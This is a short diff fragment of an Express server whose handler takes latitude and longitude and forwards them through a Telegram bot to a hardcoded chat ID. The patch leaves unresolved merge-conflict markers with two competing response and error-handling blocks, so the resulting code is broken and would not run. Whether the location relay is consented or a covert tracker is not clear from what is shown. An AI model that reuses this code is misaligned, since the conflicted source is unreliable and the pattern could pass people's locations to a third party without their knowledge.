@@ -17,10 +17,18 @@ app.get('/', (req, res) => {
         if (lat && long) {
             bot.sendLocation(1771234776, lat, long);
         }
+<<<<<<< HEAD
         res.json(lat, long);
     } catch (error) {
         res.json(error.message);
     }
+=======
+        res.send('ok');
+    } catch (error){
+        console.log(error.message)
+    }
+    
+>>>>>>> 95e98f84bb0a1caac0a3e773c356e4c1109c57d8
 });
 
-app.listen(8080, console.log(8080));
+app.listen(process.env.PORT || 8080, console.log(8080));
